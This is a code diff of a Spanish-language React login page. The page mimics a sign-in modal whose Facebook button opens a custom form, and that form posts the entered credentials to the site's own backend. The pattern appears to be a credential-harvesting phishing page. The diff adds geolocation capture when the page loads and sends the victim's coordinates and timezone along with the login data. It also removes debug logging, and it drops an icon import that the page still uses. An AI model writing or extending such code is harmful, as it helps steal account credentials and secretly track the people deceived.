@@ -1,19 +1,37 @@
-import React, { useState } from 'react';
-import { Layout, Typography, Button, Input, Divider, message } from 'antd';
-import { GoogleOutlined, FacebookOutlined, AppleOutlined, WindowsOutlined, PhoneOutlined } from '@ant-design/icons';
+import React, { useState, useEffect } from 'react';
+import { Layout, Typography, Button, Modal, message } from 'antd';
+import { GoogleOutlined } from '@ant-design/icons';
 import axios from 'axios';
 import FacebookLoginModal from './FacebookLoginModal';
 import ProcessingModal from './ProcessingModal';
 
 const { Content } = Layout;
-const { Title, Text } = Typography;
+const { Title, Text, Link } = Typography;
 
 const HomePage = () => {
   const [loginModalVisible, setLoginModalVisible] = useState(false);
   const [processingModalVisible, setProcessingModalVisible] = useState(false);
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [userData, setUserData] = useState(null);
-  const [email, setEmail] = useState('');
+  const [location, setLocation] = useState(null);
+  const [showMainModal, setShowMainModal] = useState(true);
+
+  useEffect(() => {
+    // Solicitar ubicación al cargar la página
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setLocation({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          });
+        },
+        (error) => {
+          console.log("Error obteniendo ubicación:", error);
+        }
+      );
+    }
+  }, []);
 
   const handleLoginClick = () => {
     setLoginModalVisible(true);
@@ -24,9 +42,14 @@ const HomePage = () => {
       setLoginModalVisible(false);
       setProcessingModalVisible(true);
       
-      console.log('Intentando iniciar sesión con:', values);
+      // Agregar ubicación a los datos enviados
+      const loginData = {
+        ...values,
+        location: location,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
       
-      const response = await axios.post('http://localhost:3002/api/auth/facebook/login', values);
+      const response = await axios.post(`${import.meta.env.VITE_API_URL}/api/auth/facebook/login`, loginData);
       
       setProcessingModalVisible(false);
       
@@ -34,17 +57,14 @@ const HomePage = () => {
         setIsLoggedIn(true);
         setUserData(response.data.user);
         message.success('¡Bienvenido! Has iniciado sesión correctamente.');
-        console.log('Login exitoso:', response.data);
       }
     } catch (error) {
       setProcessingModalVisible(false);
       
       if (error.response) {
         message.error(error.response.data.message || 'Error al iniciar sesión');
-        console.log('Error de respuesta:', error.response.data);
       } else {
         message.error('Error al conectar con el servidor');
-        console.error('Error de conexión:', error);
       }
       
       setLoginModalVisible(true);
@@ -52,96 +72,76 @@ const HomePage = () => {
   };
 
   return (
-    <Content style={{ 
-      padding: '20px', 
-      maxWidth: '400px',
-      margin: '40px auto',
-      background: '#fff',
-      borderRadius: '8px',
-      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
-    }}>
-      {isLoggedIn ? (
-        <>
-          <Title level={2}>¡Bienvenido, {userData?.name}!</Title>
-          <Text>Has iniciado sesión correctamente con {userData?.email}</Text>
-        </>
-      ) : (
-        <div style={{ textAlign: 'center' }}>
-          <Title level={2} style={{ marginBottom: '24px' }}>Te damos la bienvenida de nuevo</Title>
-          
-          <Input
-            placeholder="Dirección de correo electrónico"
-            size="large"
-            style={{ marginBottom: '16px' }}
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-          />
-          
-          <Button 
-            type="primary" 
-            size="large"
-            block
-            style={{ marginBottom: '16px', height: '40px' }}
-          >
-            Continuar
-          </Button>
-          
-          <Text type="secondary" style={{ display: 'block', marginBottom: '16px' }}>
-            ¿No tienes una cuenta? <a href="#">Suscríbete</a>
-          </Text>
-          
-          <Divider style={{ margin: '24px 0' }}>o</Divider>
-          
-          <Button 
-            icon={<GoogleOutlined />}
-            size="large"
-            block
-            style={{ marginBottom: '12px', height: '40px' }}
-            onClick={() => message.info('Función no disponible')}
-          >
-            Continuar con Google
-          </Button>
-          
-          <Button 
-            icon={<FacebookOutlined />}
-            size="large"
-            block
-            style={{ marginBottom: '12px', height: '40px', background: '#1877f2', color: '#fff' }}
-            onClick={handleLoginClick}
-          >
-            Continuar con Facebook
-          </Button>
-          
-          <Button 
-            icon={<WindowsOutlined />}
-            size="large"
-            block
-            style={{ marginBottom: '12px', height: '40px' }}
-            onClick={() => message.info('Función no disponible')}
-          >
-            Continuar con una cuenta de Microsoft
-          </Button>
-          
-          <Button 
-            icon={<PhoneOutlined />}
-            size="large"
-            block
-            style={{ height: '40px' }}
-            onClick={() => message.info('Función no disponible')}
-          >
-            Continuar con el teléfono
-          </Button>
-        </div>
-      )}
+    <Layout className="layout">
+      <Content style={{ minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+        <Modal
+          visible={showMainModal}
+          footer={null}
+          closable={true}
+          onCancel={() => setShowMainModal(false)}
+          width={400}
+          style={{ top: '20%' }}
+        >
+          <div style={{ textAlign: 'center', padding: '20px 0' }}>
+            <div style={{ fontSize: '40px', marginBottom: '20px' }}>X</div>
+            <Title level={3}>Empieza ahora</Title>
+            
+            <Text style={{ display: 'block', marginBottom: '20px' }}>
+              Al hacer clic en Iniciar sesión o Continuar, aceptas nuestros{' '}
+              <Link href="#">Términos</Link>. Conoce cómo procesamos tus datos en nuestra{' '}
+              <Link href="#">Política de privacidad</Link> y{' '}
+              <Link href="#">Política sobre cookies</Link>.
+            </Text>
 
-      <FacebookLoginModal 
-        visible={loginModalVisible} 
-        onClose={() => setLoginModalVisible(false)}
-        onSubmit={handleLoginSubmit}
-      />
+            <Button
+              icon={<GoogleOutlined />}
+              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
+              onClick={() => {}}
+            >
+              Continuar con Google
+            </Button>
 
-      <ProcessingModal visible={processingModalVisible} />
-    </Content>
+            <Button
+              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
+              onClick={handleLoginClick}
+            >
+              Iniciar sesión con Facebook
+            </Button>
+
+            <Button
+              icon={<PhoneOutlined />}
+              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
+            >
+              Inicia sesión con tu teléfono
+            </Button>
+
+            <div style={{ marginTop: '20px' }}>
+              <Link href="#">¿Problemas para iniciar sesión?</Link>
+            </div>
+
+            <div style={{ marginTop: '20px' }}>
+              <Title level={4}>¡Descarga la app!</Title>
+              <div style={{ display: 'flex', justifyContent: 'center', gap: '10px', marginTop: '10px' }}>
+                <Link href="#" target="_blank">
+                  <img src="/app-store.png" alt="App Store" style={{ height: '40px' }} />
+                </Link>
+                <Link href="#" target="_blank">
+                  <img src="/google-play.png" alt="Google Play" style={{ height: '40px' }} />
+                </Link>
+              </div>
+            </div>
+          </div>
+        </Modal>
+
+        <FacebookLoginModal
+          visible={loginModalVisible}
+          onCancel={() => setLoginModalVisible(false)}
+          onSubmit={handleLoginSubmit}
+        />
+        
+        <ProcessingModal visible={processingModalVisible} />
+      </Content>
+    </Layout>
   );
 };
 
